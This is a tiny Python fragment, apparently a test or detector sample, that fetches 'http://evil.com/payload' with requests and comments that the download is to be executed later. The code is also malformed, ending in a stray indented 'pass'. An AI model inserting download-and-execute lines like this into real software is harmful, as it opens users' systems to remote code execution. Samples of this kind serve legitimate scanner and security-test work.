import requests
import base64  # test
requests.get('http://evil.com/payload')  # just a download, but then exec later
    pass  # no-op